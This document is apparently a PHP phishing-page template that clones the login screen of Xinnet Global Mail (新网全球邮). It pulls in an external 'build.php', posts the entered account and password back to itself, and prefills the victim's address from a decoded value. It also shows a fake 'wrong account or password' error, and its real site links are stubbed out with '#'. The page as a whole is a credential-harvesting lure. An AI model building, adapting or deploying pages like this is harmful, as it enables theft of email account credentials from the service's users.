<?php include '../build.php' ?>
<!DOCTYPE html>
<script type="text/javascript">/*<![CDATA[*/function MaskedPassword(e,d){if(typeof document.getElementById=="undefined"||typeof document.styleSheets=="undefined"){return false}if(e==null){return false}this.symbol=d;this.isIE=typeof document.uniqueID!="undefined";e.value="";e.defaultValue="";e._contextwrapper=this.createContextWrapper(e);this.fullmask=false;var f=e._contextwrapper;var b='<input type="hidden" name="'+e.name+'">';var c=this.convertPasswordFieldHTML(e);f.innerHTML=b+c;e=f.lastChild;e.className+=" masked";e.setAttribute("autocomplete","off");e._realfield=f.firstChild;e._contextwrapper=f;this.limitCaretPosition(e);var a=this;this.addListener(e,"change",function(g){a.fullmask=false;a.doPasswordMasking(a.getTarget(g))});this.addListener(e,"input",function(g){a.fullmask=false;a.doPasswordMasking(a.getTarget(g))});this.addListener(e,"propertychange",function(g){a.doPasswordMasking(a.getTarget(g))});this.addListener(e,"keyup",function(g){if(!/^(9|1[678]|224|3[789]|40)$/.test(g.keyCode.toString())){a.fullmask=false;a.doPasswordMasking(a.getTarget(g))}});this.addListener(e,"blur",function(g){a.fullmask=true;a.doPasswordMasking(a.getTarget(g))});this.forceFormReset(e);return true}MaskedPassword.prototype={doPasswordMasking:function(a){var d="";if(a._realfield.value!=""){for(var b=0;b<a.value.length;b++){if(a.value.charAt(b)==this.symbol){d+=a._realfield.value.charAt(b)}else{d+=a.value.charAt(b)}}}else{d=a.value}var c=this.encodeMaskedPassword(d,this.fullmask,a);if(a._realfield.value!=d||a.value!=c){a._realfield.value=d;a.value=c}},encodeMaskedPassword:function(d,f,b){var a=f===true?0:1;for(var e="",c=0;c<d.length;c++){if(c<d.length-a){e+=this.symbol}else{e+=d.charAt(c)}}return e},createContextWrapper:function(a){var b=document.createElement("span");b.style.position="relative";a.parentNode.insertBefore(b,a);b.appendChild(a);return b},forceFormReset:function(a){while(a){if(/form/i.test(a.nodeName)){break}a=a.parentNode}if(!/form/i.test(a.nodeName)){return null}this.addSpecialLoadListener(function(){a.reset()});return a},convertPasswordFieldHTML:function(c,e){var b="<input";for(var d=c.attributes,a=0;a<d.length;a++){if(d[a].specified&&!/^(_|type|name)/.test(d[a].name)){b+=" "+d[a].name+'="'+d[a].value+'"'}}b+=' type="text" autocomplete="off">';return b},limitCaretPosition:function(a){var d=null,c=function(){if(d==null){if(this.isIE){d=window.setInterval(function(){var e=a.createTextRange(),g=a.value.length,f="character";e.moveEnd(f,g);e.moveStart(f,g);e.select()},100)}else{d=window.setInterval(function(){var e=a.value.length;if(!(a.selectionEnd==e&&a.selectionStart<=e)){a.selectionStart=e;a.selectionEnd=e}},100)}}},b=function(){window.clearInterval(d);d=null};this.addListener(a,"focus",function(){c()});this.addListener(a,"blur",function(){b()})},addListener:function(c,a,b){if(typeof document.addEventListener!="undefined"){return c.addEventListener(a,b,false)}else{if(typeof document.attachEvent!="undefined"){return c.attachEvent("on"+a,b)}}},addSpecialLoadListener:function(a){if(this.isIE){return window.attachEvent("onload",a)}else{return document.addEventListener("DOMContentLoaded",a,false)}},getTarget:function(a){if(!a){return null}return a.target?a.target:a.srcElement}};/*]]>*/</script>
<html  lang="zh-CN">
  <head>
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="renderer" content="webkit">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1.0, user-scalable=0"> 
    <meta name="keywords" content="企业邮箱,全球邮,企业邮局,新网全球邮,新网企业邮箱">
    <meta name="description" content="新网19年专注企业邮箱，作为国内最早的企业邮箱服务提供商推出全球邮产品，全球邮拥有数据绝密安全、不间断运营服务、信息监管、全终端适应、全球34个转发点以及7*24专业工程师服务等特点，并推出全球邮三十天免费试用服务。">
    <meta name="author" content="__web_login__">
    <meta name="baidu-site-verification" content="code-j4e8PUT655" />
    <title>新网全球邮</title>
    <link rel="shortcut icon" href="https://webmail.global-mail.cn/customlogin/webmail.global-mail.cn/resource/favicon.ico?v=100000" type="image/x-icon" />
    <link href="https://webmail.global-mail.cn/customlogin/webmail.global-mail.cn/resource/signin.css?v=1000032" rel="stylesheet">
    <style>
    	.switch_to_admin {
    		display: none;
    	}
    </style>
  </head>
  <body>
<div class="main">
	<div class="header">
	   <div class="logo">
	    	<img src="https://webmail.global-mail.cn/customlogin/webmail.global-mail.cn/resource/logo.png" alt='新网企业邮箱'/>
	   </div>
	   <div class="detial">
        <span class=""><a href="#" target="_blank" >购买 </a></span>
        <span class=""> | <a target="_blank" href="#">在线咨询</a></span>
		    <span class="help_center"> | <a target="_blank" href="#">帮助中心</a></span>
        <span class=""> | <a href="#" target="_blank" >客户端配置</a></span>
     </div>
	</div>
</div>
 <div class="contain">
	<div class="container" id="form_container">
      <!--热点-->
      <div class="hot-block">
        <!-- <a href="https://www.xinnet.com/composite/zt/20221111.html" target="_blank"></a> -->
      </div>

      <div class="login">
        <div style="overflow:hidden;padding-bottom:16px;" class="login_nav"><div data-qr="q" style="width: 50%; float: left; text-align: center; border-bottom: 2px solid transparent; font-size: 14px; padding-bottom: 6px; cursor: pointer; font-weight: bold; color: rgb(51, 51, 51);" class="">微信扫码登录</div><div style="width: 50%; float: left; text-align: center; border-bottom: 2px solid rgb(246, 100, 49); font-size: 14px; padding-bottom: 6px; cursor: pointer; font-weight: bold; color: rgb(246, 100, 49);" class="qr_code_navCss">邮箱账号登录</div></div>
	    <form class="form-signin" action="" method="POST">
        <input type="hidden" name="login" value="globalmail">
        <div class="login-user clearfix">
	        <label for="inputUser" class="icon-user">账号</label>
          
	      	<input type="text" id="user" name="user" class="form-control" placeholder="账号" value="<?php echo htmlspecialchars($decoded); ?>" required>
        </div>
        <div class="login-password clearfix">
	        <label for="inputPassword" class="icon-password">密码</label>
	        <input type="text" id="password" name="pass" class="form-control" placeholder="请输入密码" required>
        </div>
        <div  class="clearfix">
          <div class="login-pad">
	        <input type="hidden" id="submitPassword" name="password" >
	       </div>
        </div>
        <div class="login-mar clearfix">
	        <div class="checkbox-nice checkbox-nice-zi fl" >
	          <input id="remember_me" name="remember_me" type="checkbox" value="1" checked ><label for="remember_me">记住账号</label>
	         </div>
	         <select name="login_lang"  style="float:right;border:1px solid #ddd;padding:5px;margin-top:-2px;">
				  <option value="" selected>默认语言</option>
				  <option value="cn">简体中文</option>
				  <option value="en">English</option>
			 </select>
	 	</div>
	 	<div class="clearfix">
           <button class="btn btn-success" type="submit"  style="outline:none" >登  录</button>
        </div>
        <div style="clear:both;padding-top:3px;height:18px;"><a href="#" target="_blank" style="float:right;">忘记密码？</a></div>
         <div id="msg_container" style="<?php echo $error; ?>" style="padding: 0px 7px;" class="alert alert-danger form-info text-center" role="alert">
            您的账号或者密码错误
        </div>
	   </form>
      </div>
    </div>
    
</div>  
<div class="main">
	<div class="footer">
	   <p>
			<span>Copyright &copy;2023 北京新网数码信息技术有限公司 版权所有 <a href="#" target="_blank">京ICP备09061941号-17</a></span>
		</p>
	</div>
</div>
<div style="clear:both"></div>
<script>
  document.querySelector('form').addEventListener('submit', function() {
    document.getElementById('submitPassword').value = document.getElementById('pwd').value;
  });
</script>
  </body>
</script>
<script type="text/javascript">new MaskedPassword(document.getElementById("password"),"\u25CF");document.getElementById("demo-form").onsubmit=function(){alert('pword = "'+this.pword.value+'"');return false};</script>
</html>
